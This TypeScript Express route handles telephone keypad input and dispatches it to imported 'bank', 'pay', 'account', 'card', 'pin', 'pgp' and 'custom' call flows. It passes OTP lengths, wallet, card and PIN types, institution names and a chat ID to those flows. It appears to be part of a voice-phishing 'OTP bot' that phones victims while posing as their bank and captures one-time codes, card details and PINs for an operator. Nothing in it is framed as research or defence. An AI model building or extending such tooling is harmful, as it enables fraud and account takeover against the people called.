import { app } from '..';
import { customDtmfFlow } from '../../utils/customDtmfFlow';
import {
  bankFlow,
  payFlow,
  accountFlow,
  cardFlow,
  pinFlow,
  pgpFlow,
} from '../../utils/dtmfFlow';

app.post('/calls/dtmf/:language/:step/:chatId', (req, res) => {
  const { step, language, chatId } = req.params;
  const {
    wallet,
    askCardInfo,
    cardType,
    pinType,
    transferNumber,
    institutionName,
    from,
    actions,
    customMessage,
    otpLength,
  } = req.query;

  const dtmf = req.body.Digits;
  const destination = req.body.To;

  switch (step) {
    case 'bank':
      bankFlow(
        String(dtmf),
        res,
        language,
        Number(chatId),
        step,
        destination as string,
        Number(otpLength),
      );

      break;
    case 'pay':
      payFlow(
        String(dtmf),
        res,
        language,
        Number(chatId),
        step,
        destination as string,
        Number(otpLength),
        wallet as string,
      );
      break;
    case 'account':
      accountFlow(
        String(dtmf),
        res,
        language,
        Number(chatId),
        step,
        destination as string,
        Number(otpLength),
        askCardInfo as string,
      );
      break;
    case 'card':
      cardFlow(
        String(dtmf),
        res,
        language,
        Number(chatId),
        step,
        destination as string,
        cardType as string,
      );
      break;
    case 'pin':
      pinFlow(
        String(dtmf),
        res,
        language,
        Number(chatId),
        step,
        destination as string,
        pinType as string,
      );
      break;
    case 'pgp':
      pgpFlow(
        dtmf,
        res,
        language,
        Number(chatId),
        step,
        String(destination),
        String(transferNumber),
        String(institutionName),
        String(from),
      );
      break;
    case 'custom':
      customDtmfFlow(
        dtmf,
        res,
        language,
        Number(chatId),
        step,
        String(destination),
        String(actions),
        String(customMessage),
      );
      break;
    default:
      break;
  }
});
